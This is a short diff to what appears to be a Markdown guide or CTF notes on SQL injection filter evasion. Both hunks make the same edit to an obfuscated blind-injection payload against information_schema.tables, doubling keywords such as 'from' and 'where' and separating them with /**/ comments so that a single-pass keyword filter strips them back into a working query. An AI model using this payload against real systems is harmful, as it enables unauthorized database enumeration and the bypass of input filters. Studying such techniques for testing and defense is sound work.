@@ -56,7 +56,7 @@ IF -> IIFF
 ```sql
 and(select 1 from information_schema.tables where table_name like 'f%' limit 1)
 
-aandnd(selselectect/**/1/**/from/**/infoorrmation_schema.tables/**/where/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
+aandnd(selselectect/**/1/**/frfromom/**/infoorrmation_schema.tables/**/whewherere/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
 ```
 
 > [!IMPORTANT]
@@ -180,7 +180,7 @@ following replacement:
 ```sql
 and(select 1 from information_schema.tables where table_name like 'f%' limit 1)
 
-aandnd(selselectect/**/1/**/from/**/infoorrmation_schema.tables/**/where/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
+aandnd(selselectect/**/1/**/frfromom/**/infoorrmation_schema.tables/**/whewherere/**/table_name/**/like/**/'%f%'/**/limit/**/1/**/)
 ```
 
 > [!IMPORTANT]
